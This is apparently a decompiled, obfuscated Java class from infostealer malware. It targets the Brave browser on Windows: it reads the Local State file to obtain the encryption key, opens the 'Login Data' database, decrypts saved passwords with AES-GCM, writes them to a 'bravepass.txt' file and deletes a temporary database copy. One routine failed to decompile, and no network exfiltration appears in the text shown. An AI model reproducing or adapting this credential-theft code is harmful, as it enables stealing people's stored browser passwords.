package 0.0.0.0;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class 0d {
   private static final String 0 = "YourSecretKey123";
   private static final String 1 = System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
   private static final String 2 = System.getenv("temp") + "\\tempfile.db";

   public void _/* $FF was: 0*/() {
      this.1();
      this.2();
   }

   private void _/* $FF was: 1*/() {
      File userData = new File(1);

      try {
         if (!userData.exists()) {
            return;
         }
      } catch (RuntimeException var5) {
         throw var5;
      }

      byte[] key = this.0(new File(System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State"));
      if (key != null) {
         File loginData = new File(userData, "Login Data");

         try {
            if (loginData.exists()) {
               this.0(loginData, key, "", "bravepass.txt");
            }
         } catch (RuntimeException var4) {
            throw var4;
         }
      }

   }

   private byte[] _/* $FF was: 0*/(File localStateFile) {
      try {
         if (!localStateFile.exists()) {
            return null;
         }
      } catch (RuntimeException var2) {
         throw var2;
      }

      return 9.0(localStateFile);
   }

   private void _/* $FF was: 0*/(File param1, byte[] param2, String param3, String param4) {
      // $FF: Couldn't be decompiled
   }

   private String _/* $FF was: 0*/(byte[] encryptedData, byte[] key) {
      try {
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
         byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
         GCMParameterSpec spec = new GCMParameterSpec(128, iv);
         SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
         cipher.init(2, keySpec, spec);
         byte[] decryptedBytes = cipher.doFinal(payload);
         return new String(decryptedBytes, "UTF-8");
      } catch (Exception var9) {
         return null;
      }
   }

   private void _/* $FF was: 2*/() {
      try {
         Files.deleteIfExists(Paths.get(2));
      } catch (IOException var2) {
      }

   }
}
